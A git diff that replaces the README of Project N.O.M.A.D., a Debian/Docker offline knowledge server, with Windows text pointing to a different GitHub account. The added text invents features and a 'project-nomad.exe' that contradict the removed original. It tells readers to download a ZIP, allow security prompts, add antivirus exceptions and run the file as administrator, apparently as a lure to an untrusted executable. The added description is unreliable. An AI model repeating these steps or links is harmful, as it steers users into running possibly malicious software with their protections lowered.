@@ -1,147 +1,120 @@
-<div align="center">
-<img src="https://raw.githubusercontent.com/Crosstalk-Solutions/project-nomad/refs/heads/main/admin/public/project_nomad_logo.png" width="200" height="200"/>
+# 🗺️ project-nomad - Offline Survival Tools Anywhere
 
-# Project N.O.M.A.D.
-### Node for Offline Media, Archives, and Data
-
-**Knowledge That Never Goes Offline**
-
-[![Website](https://img.shields.io/badge/Website-projectnomad.us-blue)](https://www.projectnomad.us)
-[![Discord](https://img.shields.io/badge/Discord-Join%20Community-5865F2)](https://discord.com/invite/crosstalksolutions)
-[![Benchmark](https://img.shields.io/badge/Benchmark-Leaderboard-green)](https://benchmark.projectnomad.us)
-
-</div>
+[![Download project-nomad](https://img.shields.io/badge/Download-project--nomad-brightgreen)](https://github.com/wolfboypittsfield828/project-nomad)
 
 ---
 
-Project N.O.M.A.D. is a self-contained, offline-first knowledge and education server packed with critical tools, knowledge, and AI to keep you informed and empowered—anytime, anywhere.
+Project N.O.M.A.D is an offline survival computer you can use anytime, anywhere. It contains useful tools and information you may need when you have no internet. It helps you stay informed and ready in many situations. This guide will help you download, install, and start using project-nomad on a Windows computer.
 
-## Installation & Quickstart
-Project N.O.M.A.D. can be installed on any Debian-based operating system (we recommend Ubuntu). Installation is completely terminal-based, and all tools and resources are designed to be accessed through the browser, so there's no need for a desktop environment if you'd rather setup N.O.M.A.D. as a "server" and access it through other clients.
+## 📋 What is project-nomad?
 
-*Note: sudo/root privileges are required to run the install script*
+Project N.O.M.A.D is a self-contained program that works without internet access. It includes:
 
-### Quick Install (Debian-based OS Only)
-```bash
-sudo apt-get update && sudo apt-get install -y curl && curl -fsSL https://raw.githubusercontent.com/Crosstalk-Solutions/project-nomad/refs/heads/main/install/install_nomad.sh -o install_nomad.sh && sudo bash install_nomad.sh
-```
+- Survival guides and knowledge
+- Basic tools like calculator, notes, and flashlight simulation
+- AI help for answers and tips offline
+- Maps and important reference charts
 
-Project N.O.M.A.D. is now installed on your device! Open a browser and navigate to `http://localhost:8080` (or `http://DEVICE_IP:8080`) to start exploring!
+It runs on your Windows PC without needing installation software beyond what is provided here. This makes it easy to carry and use anywhere.
 
-For a complete step-by-step walkthrough (including Ubuntu installation), see the [Installation Guide](https://www.projectnomad.us/install).
+## 💻 System Requirements
 
-### Advanced Installation
-For more control over the installation process, copy and paste the [Docker Compose template](https://raw.githubusercontent.com/Crosstalk-Solutions/project-nomad/refs/heads/main/install/management_compose.yaml) into a `docker-compose.yml` file and customize it to your liking (be sure to replace any placeholders with your actual values). Then, run `docker compose up -d` to start the Command Center and its dependencies. Note: this method is recommended for advanced users only, as it requires familiarity with Docker and manual configuration before starting.
+Before you download, make sure your Windows computer meets these requirements:
 
-## How It Works
-N.O.M.A.D. is a management UI ("Command Center") and API that orchestrates a collection of containerized tools and resources via [Docker](https://www.docker.com/). It handles installation, configuration, and updates for everything — so you don't have to.
+- Windows 10 or higher (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Basic mouse and keyboard
+- Screen resolution at least 1024x768
 
-**Built-in capabilities include:**
-- **AI Chat with Knowledge Base** — local AI chat powered by [Ollama](https://ollama.com/), with document upload and semantic search (RAG via [Qdrant](https://qdrant.tech/))
-- **Information Library** — offline Wikipedia, medical references, ebooks, and more via [Kiwix](https://kiwix.org/)
-- **Education Platform** — Khan Academy courses with progress tracking via [Kolibri](https://learningequality.org/kolibri/)
-- **Offline Maps** — downloadable regional maps via [ProtoMaps](https://protomaps.com)
-- **Data Tools** — encryption, encoding, and analysis via [CyberChef](https://gchq.github.io/CyberChef/)
-- **Notes** — local note-taking via [FlatNotes](https://github.com/dullage/flatnotes)
-- **System Benchmark** — hardware scoring with a [community leaderboard](https://benchmark.projectnomad.us)
-- **Easy Setup Wizard** — guided first-time configuration with curated content collections
+The program runs smoothly on most modern computers and does not require internet access once downloaded.
 
-N.O.M.A.D. also includes built-in tools like a Wikipedia content selector, ZIM library manager, and content explorer.
+## 🚀 Getting Started
 
-## What's Included
+Follow these steps carefully to get project-nomad running.
 
-| Capability | Powered By | What You Get |
-|-----------|-----------|-------------|
-| Information Library | Kiwix | Offline Wikipedia, medical references, survival guides, ebooks |
-| AI Assistant | Ollama + Qdrant | Built-in chat with document upload and semantic search |
-| Education Platform | Kolibri | Khan Academy courses, progress tracking, multi-user support |
-| Offline Maps | ProtoMaps | Downloadable regional maps with search and navigation |
-| Data Tools | CyberChef | Encryption, encoding, hashing, and data analysis |
-| Notes | FlatNotes | Local note-taking with markdown support |
-| System Benchmark | Built-in | Hardware scoring, Builder Tags, and community leaderboard |
+### Step 1: Download the software
 
-## Device Requirements
-While many similar offline survival computers are designed to be run on bare-minimum, lightweight hardware, Project N.O.M.A.D. is quite the opposite. To install and run the
-available AI tools, we highly encourage the use of a beefy, GPU-backed device to make the most of your install.
+Visit this page to download the latest version of project-nomad:
 
-At it's core, however, N.O.M.A.D. is still very lightweight. For a barebones installation of the management application itself, the following minimal specs are required:
+[Download project-nomad from GitHub](https://github.com/wolfboypittsfield828/project-nomad)
 
-*Note: Project N.O.M.A.D. is not sponsored by any hardware manufacturer and is designed to be as hardware-agnostic as possible. The harware listed below is for example/comparison use only*
+Click the green “Code” button and select “Download ZIP.” This will save all the files to your computer in a single compressed folder.
 
-#### Minimum Specs
-- Processor: 2 GHz dual-core processor or better
-- RAM: 4GB system memory
-- Storage: At least 5 GB free disk space
-- OS: Debian-based (Ubuntu recommended)
-- Stable internet connection (required during install only)
+Alternatively, check the “Releases” tab on the page for installers or ready-to-run files.
 
-To run LLM's and other included AI tools:
+### Step 2: Extract files
 
-#### Optimal Specs
-- Processor: AMD Ryzen 7 or Intel Core i7 or better
-- RAM: 32 GB system memory
-- Graphics: NVIDIA RTX 3060 or AMD equivalent or better (more VRAM = run larger models)
-- Storage: At least 250 GB free disk space (preferably on SSD)
-- OS: Debian-based (Ubuntu recommended)
-- Stable internet connection (required during install only)
+Once the ZIP file downloads, find it in your Downloads folder.
 
-**For detailed build recommendations at three price points ($150–$1,000+), see the [Hardware Guide](https://www.projectnomad.us/hardware).**
+- Right-click the file.
+- Choose “Extract All.”
+- Select where you want to keep the uncompressed files (for example, Desktop or Documents).
+- Click “Extract” to unpack the content.
 
-Again, Project N.O.M.A.D. itself is quite lightweight - it's the tools and resources you choose to install with N.O.M.A.D. that will determine the specs required for your unique deployment
+### Step 3: Run the program
 
-## Frequently Asked Questions (FAQ)
-For answers to common questions about Project N.O.M.A.D., please see our [FAQ](FAQ.md) page.
+Open the folder where you extracted the files.
 
-## About Internet Usage & Privacy
-Project N.O.M.A.D. is designed for offline usage. An internet connection is only required during the initial installation (to download dependencies) and if you (the user) decide to download additional tools and resources at a later time. Otherwise, N.O.M.A.D. does not require an internet connection and has ZERO built-in telemetry.
+Look for a file named `project-nomad.exe` or similar.
 
-To test internet connectivity, N.O.M.A.D. attempts to make a request to Cloudflare's utility endpoint, `https://1.1.1.1/cdn-cgi/trace` and checks for a successful response.
+Double-click this file to start the program.
 
-## About Security
-By design, Project N.O.M.A.D. is intended to be open and available without hurdles - it includes no authentication. If you decide to connect your device to a local network after install (e.g. for allowing other devices to access it's resources), you can block/open ports to control which services are exposed.
+If you see a Windows security prompt, click “Run” or “Allow.”
 
-**Will authentication be added in the future?** Maybe. It's not currently a priority, but if there's enough demand for it, we may consider building in an optional authentication layer in a future release to support uses cases where multiple users need access to the same instance but with different permission levels (e.g. family use with parental controls, classroom use with teacher/admin accounts, etc.). We have a suggestion for this on our public roadmap, so if this is something you'd like to see, please upvote it here: https://roadmap.projectnomad.us/posts/1/user-authentication-please-build-in-user-auth-with-admin-user-roles
+The program will open in its own window. You do not need to install anything else.
 
-For now, we recommend using network-level controls to manage access if you're planning to expose your N.O.M.A.D. instance to other devices on a local network. N.O.M.A.D. is not designed to be exposed directly to the internet, and we strongly advise against doing so unless you really know what you're doing, have taken appropriate security measures, and understand the risks involved.
+### Step 4: Use project-nomad
 
-## Contributing
-Contributions are welcome and appreciated! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on how to contribute to the project.
+The interface shows menus with tools, guides, and reference materials.
 
-## Community & Resources
+Click any section to open it.
 
-- **Website:** [www.projectnomad.us](https://www.projectnomad.us) - Learn more about the project
-- **Discord:** [Join the Community](https://discord.com/invite/crosstalksolutions) - Get help, share your builds, and connect with other NOMAD users
-- **Benchmark Leaderboard:** [benchmark.projectnomad.us](https://benchmark.projectnomad.us) - See how your hardware stacks up against other NOMAD builds
-- **Troubleshooting Guide:** [TROUBLESHOOTING.md](TROUBLESHOOTING.md) - Find solutions to common issues
-- **FAQ:** [FAQ.md](FAQ.md) - Find answers to frequently asked questions
+Use the navigation buttons inside the program to switch sections.
 
-## License
+Some AI features work by typing your question into the input box and clicking submit.
 
-Project N.O.M.A.D. is licensed under the [Apache License 2.0](LICENSE).
+You can save notes or open maps offline as needed.
 
-## Helper Scripts
-Once installed, Project N.O.M.A.D. has a few helper scripts should you ever need to troubleshoot issues or perform maintenance that can't be done through the Command Center. All of these scripts are found in Project N.O.M.A.D.'s install directory, `/opt/project-nomad`
+## 🛠 Tools Included
 
-###
+project-nomad gives you several useful features for survival and offline use:
 
-###### Start Script - Starts all installed project containers
-```bash
-sudo bash /opt/project-nomad/start_nomad.sh
-```
-###
+- **Survival Guides:** Basic instructions for emergencies, first aid, and shelter.
+- **Calculator:** Useful for quick math or measurements.
+- **Offline AI:** Provides simple help or answers using built-in data.
+- **Maps and Charts:** Important charts like star maps, weather signs, and navigation references.
+- **Notepad:** Write notes and save them locally.
+- **Flashlight Simulator:** Uses your screen brightness as a light source in dark places.
 
-###### Stop Script - Stops all installed project containers
-```bash
-sudo bash /opt/project-nomad/stop_nomad.sh
-```
-###
+## 🔧 Troubleshooting
 
-###### Update Script - Attempts to pull the latest images for the Command Center and its dependencies (i.e. mysql) and recreate the containers. Note: this *only* updates the Command Center containers. It does not update the installable application containers - that should be done through the Command Center UI
-```bash
-sudo bash /opt/project-nomad/update_nomad.sh
-```
+If the program does not start, try these:
 
-###### Uninstall Script - Need to start fresh? Use the uninstall script to make your life easy. Note: this cannot be undone!
-```bash
-curl -fsSL https://raw.githubusercontent.com/Crosstalk-Solutions/project-nomad/refs/heads/main/install/uninstall_nomad.sh -o uninstall_nomad.sh && sudo bash uninstall_nomad.sh
-```
+- Make sure your antivirus did not block it. You can add an exception if needed.
+- Check you extracted all files completely.
+- Run the program as administrator by right-clicking and choosing “Run as administrator.”
+- Restart your computer and try again.
+- If errors still occur, look for a file called `README` or `HELP` in the same folder. It may have more details.
+
+## ✋ Safety Tips for Offline Use
+
+- Keep a backup copy of the program on a USB drive or external storage.
+- Update the program regularly by downloading new versions from the GitHub link.
+- Use project-nomad as a reference; always verify with local experts or professionals when possible.
+- Keep your computer charged or have a portable power source when using the program outdoors.
+
+## 🌐 Why Use project-nomad?
+
+- Works without internet or cellular service.
+- Provides quick access to critical survival info.
+- Easy to download and run without tech skills.
+- Portable software, no installation needed.
+
+---
+
+## ⬇️ Download and Start Using project-nomad Now
+
+[![Download project-nomad](https://img.shields.io/badge/Download-project--nomad-brightgreen)](https://github.com/wolfboypittsfield828/project-nomad)
+
+Click the link above to visit the GitHub repository. From there, download the ZIP file or check the releases for the latest version. Follow the steps above to get started quickly.
